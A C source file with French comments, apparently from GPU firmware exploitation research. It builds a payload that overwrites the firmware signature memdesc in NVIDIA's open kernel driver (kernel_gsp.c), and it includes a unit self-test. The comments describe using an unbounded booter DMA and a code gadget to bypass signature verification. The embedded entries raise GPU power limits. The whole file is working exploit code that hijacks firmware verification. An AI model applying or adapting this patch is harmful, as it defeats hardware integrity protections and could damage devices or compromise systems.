/*
 * transfer_list_memdesc.c — 4.42 TÂCHE 3 : l'injection de la
 * transfer-list dans le memdesc signature du driver (kernel_gsp.c).
 *
 * Le point d'injection RÉEL (open-gpu-kernel-modules 610.57.04,
 * src/nvidia/src/kernel/gpu/gsp/kernel_gsp.c:5666-5713, cité ce pass) :
 *
 *   static NV_STATUS _kgspCreateSignatureMemdesc(OBJGPU*, KernelGsp*, GSP_FIRMWARE*)
 *   {
 *       memdescCreate(&pKernelGsp->pSignatureMemdesc, pGpu,
 *           NV_ALIGN_UP(pGspFw->signatureSize, 256), 256,
 *           NV_TRUE, ADDR_SYSMEM, NV_MEMORY_CACHED, flags);
 *       ...
 *       pSignatureVa = memdescMapInternal(pGpu, pKernelGsp->pSignatureMemdesc, ...);
 *       portMemCopy(pSignatureVa, memdescGetSize(...),
 *           pGspFw->pSignatureData, pGspFw->signatureSize);   <-- LA SOURCE
 *       memdescUnmapInternal(...);
 *   }
 *
 * Le patch remplace la SOURCE du portMemCopy (ou réécrit pSignatureVa
 * après) par NOTRE transfer-list : les octets du memdesc = ce que le
 * booter DMA sur sa pile (le DMA non borné, PROUVÉ en silicium, 7+
 * runs STATE.md) = la source de la marche du gadget 0x100b3e.
 *
 * La TAILLE PROUVÉE : .fwsignature_ga10x = 0x1000 (4096 B) dans NOTRE
 * gsp_ga10x.bin (mesuré ce pass) -> signatureSize = 0x1000 ->
 * NV_ALIGN_UP(0x1000,256) = 0x1000. Le memdesc = 4096 B = 512 slots u64.
 *
 * Le LAYOUT (le même que lab/jalon411/v442e_transfer_list_build.py) :
 *   [0x000..0x487] 0xFF (le remplissage stock)
 *   [0x488] slot0      u64  (le champ +0x488 du ctx que lit la boucle)
 *   [0x490] capacité   u64  (+0x490)
 *   [0x498] dest base  u64  (+0x498)
 *   [0x4A0] magic byte u8=8 (le setup écrit 0x8, li a2,0x8 @0x1022c8)
 *   [0x500] la LISTE : les entrées u64 PLATES (le pas = +8, PROUVÉ :
 *           addi a6,a5,0x8 @0x100b40 — PAS de {valeur,next} 16 B)
 *
 * Le contrat runtime (le plan registres du gadget, mode GADGET entrée
 * 0x100b3e) :
 *   a4 = l'adresse RUNTIME du payload (le ctx fabriqué à +0x488..)
 *   a1 = la PREMIÈRE cible (absolue, registre)
 *   a3 = N (la borne d'itérations), a7 = 0, a0 = ~0 (le chemin RAW)
 *   sp+8 = &list[0] (la cellule de marche)
 *
 * Le test unitaire : gcc -DTL_SELFTEST -o tl_test transfer_list_memdesc.c
 * puis ./tl_test dump.bin — et lab/jalon411/v442f_c_payload_test.py
 * compare byte-exact vs le builder python.
 */
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdio.h>

#define TL_MEMDESC_SIZE   0x1000u   /* 4096 B — PROUVÉ (.fwsignature_ga10x) */
#define TL_CTX_SLOT0_OFF  0x488u    /* le champ slot du ctx (+0x488) */
#define TL_CTX_CAP_OFF    0x490u    /* la capacité (+0x490) */
#define TL_CTX_DEST_OFF   0x498u    /* la dest base (+0x498) */
#define TL_CTX_MAGIC_OFF  0x4A0u    /* le magic byte (+0x4A0) = 8 */
#define TL_LIST_OFF       0x500u    /* la tête de liste */
#define TL_MAGIC_BYTE     0x08u

typedef struct {
    uint64_t slot0;       /* le slot de départ du ring fabriqué */
    uint64_t capacity;    /* la capacité (slots u64) — le wrap à 1 */
    uint64_t dest;        /* la base de destination (absolue runtime) */
    const uint64_t *list; /* les entrées (PLATES, le pas +8) */
    uint32_t count;       /* N — doit être <= (TL_MEMDESC_SIZE-TL_LIST_OFF)/8 */
} tl_config;

static void
tl_store_u64(uint8_t *p, uint64_t v)
{
    /* le GSP = little-endian RV64 ; le memdesc = lu tel quel par le DMA */
    p[0] = (uint8_t)(v);         p[1] = (uint8_t)(v >> 8);
    p[2] = (uint8_t)(v >> 16);   p[3] = (uint8_t)(v >> 24);
    p[4] = (uint8_t)(v >> 32);   p[5] = (uint8_t)(v >> 40);
    p[6] = (uint8_t)(v >> 48);   p[7] = (uint8_t)(v >> 56);
}

/*
 * Construit le payload 4096 B : le contenu NOUVEAU du memdesc signature.
 * Le remplissage = 0xFF (le pattern stock de la signature) partout hors
 * ctx/liste — le scénario "au lieu des 0xFF actuels" du brief.
 */
void
tl_build_payload(uint8_t *img /* [TL_MEMDESC_SIZE] */, const tl_config *cfg)
{
    uint32_t i;
    memset(img, 0xFF, TL_MEMDESC_SIZE);
    tl_store_u64(img + TL_CTX_SLOT0_OFF, cfg->slot0);
    tl_store_u64(img + TL_CTX_CAP_OFF,   cfg->capacity);
    tl_store_u64(img + TL_CTX_DEST_OFF,  cfg->dest);
    img[TL_CTX_MAGIC_OFF] = TL_MAGIC_BYTE;
    for (i = 0; i < cfg->count; i++) {
        tl_store_u64(img + TL_LIST_OFF + 8u * i, cfg->list[i]);
    }
}

/*
 * Le point d'injection — la forme du patch driver : appelée JUSTE APRÈS
 * le portMemCopy de _kgspCreateSignatureMemdesc (pSignatureVa encore
 * mappé), elle remplace le contenu du memdesc par la transfer-list.
 * La taille copiée = min(signatureSize, TL_MEMDESC_SIZE) — la signature
 * réelle est ÉCRASÉE (le consommateur = le booter, le LS-verify lit ce
 * que le DMA dépose : le hijack remplace la vérification).
 */
void
tl_patch_signature_memdesc(uint8_t *pSignatureVa /* memdesc mappé */)
{
    /* la config = la table E1/E2 de v442e (les valeurs, pas inventées) :
     * E1 : {limitRated 240000 conservé, limitMax 280000} =
     *      0x000445C00003A980 (mW u32 LE, PROUVÉ transport) */
    static const uint64_t list[] = {
        0x000445C00003A980ull,  /* E1 -> [a1] = params+0x108 (résolu runtime) */
        0x000445C00003A980ull,  /* le scatter slot1 */
        0x000445C00003A980ull,  /* le scatter slot2 */
    };
    static const tl_config cfg = {
        .slot0    = 0,
        .capacity = 0x400,               /* 1024 slots (>= N, pas de wrap) */
        .dest     = 0ull,                /* REMPLI AU RUNTIME (la base résolue) */
        .list     = list,
        .count    = 3,
    };
    uint8_t img[TL_MEMDESC_SIZE];
    tl_build_payload(img, &cfg);
    memcpy(pSignatureVa, img, TL_MEMDESC_SIZE);
}

#ifdef TL_SELFTEST
/* le test unitaire C : les invariants de layout + le dump optionnel */
int
main(int argc, char **argv)
{
    uint8_t img[TL_MEMDESC_SIZE];
    static const uint64_t list[3] = {
        0x000445C00003A980ull, 0x000445C00003A980ull, 0x000445C00003A980ull
    };
    tl_config cfg = { 0, 0x400, 0, list, 3 };
    int fails = 0;
    size_t i;

    tl_build_payload(img, &cfg);

    /* T1 : le remplissage 0xFF hors ctx/liste */
    for (i = 0; i < TL_CTX_SLOT0_OFF; i++)
        if (img[i] != 0xFF) { fails++; break; }
    /* T2 : les champs ctx */
    if (img[TL_CTX_SLOT0_OFF] != 0) fails++;
    if (img[TL_CTX_CAP_OFF]   != 0x00 || img[TL_CTX_CAP_OFF+1] != 0x04) fails++;
    if (img[TL_CTX_MAGIC_OFF] != TL_MAGIC_BYTE) fails++;
    /* T3 : la tête de liste = E1 little-endian */
    if (img[TL_LIST_OFF]   != 0x80 || img[TL_LIST_OFF+1] != 0xA9 ||
        img[TL_LIST_OFF+2] != 0x03 || img[TL_LIST_OFF+3] != 0x00 ||
        img[TL_LIST_OFF+4] != 0xC0 || img[TL_LIST_OFF+5] != 0x45 ||
        img[TL_LIST_OFF+6] != 0x04 || img[TL_LIST_OFF+7] != 0x00) fails++;
    /* T4 : entre la fin de liste et la fin = 0xFF */
    for (i = TL_LIST_OFF + 8 * 3; i < TL_MEMDESC_SIZE; i++)
        if (img[i] != 0xFF) { fails++; break; }

    printf("tl_c_selftest: %s (%d groups failed of 4)\n", fails ? "FAIL" : "PASS", fails);
    if (argc > 1) {
        FILE *f = fopen(argv[1], "wb");
        if (f) { fwrite(img, 1, TL_MEMDESC_SIZE, f); fclose(f); }
    }
    return fails ? 1 : 0;
}
#endif /* TL_SELFTEST */
